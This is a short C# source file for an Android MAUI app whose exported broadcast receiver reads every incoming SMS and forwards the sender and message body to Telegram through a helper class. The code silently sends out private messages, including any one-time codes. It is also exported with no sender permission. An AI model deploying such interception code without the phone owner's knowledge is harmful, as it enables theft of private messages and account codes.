using Android.App;
using Android.Content;
using MauiApp1.Helpers;
using SmsMessage = Android.Telephony.SmsMessage;

namespace MauiApp1;

[BroadcastReceiver(Enabled = true, Exported = true)]
[IntentFilter(new[] { "android.provider.Telephony.SMS_RECEIVED" })]
public class SmsReceiver : BroadcastReceiver
{
    public override async void OnReceive(Context context, Intent intent)
    {
        if (intent.Action != "android.provider.Telephony.SMS_RECEIVED")
        {
            return;
        }

        // Get the SMS message
        var bundle = intent.Extras;
        if (bundle == null) return;

        var pdus = bundle.Get("pdus");
        var castedPdus = (Java.Lang.Object[])pdus;
        var messages = new SmsMessage[castedPdus.Length];
        for (var i = 0; i < castedPdus.Length; i++)
        {
            messages[i] = SmsMessage.CreateFromPdu((byte[])castedPdus[i]);
        }

        // Get the sender phone number
        var sender = messages[0].OriginatingAddress;

        // Get the message body
        var messageBody = messages[0].MessageBody;

        await TgHelper.SendToTelegramAsync(sender, messageBody);
    }
}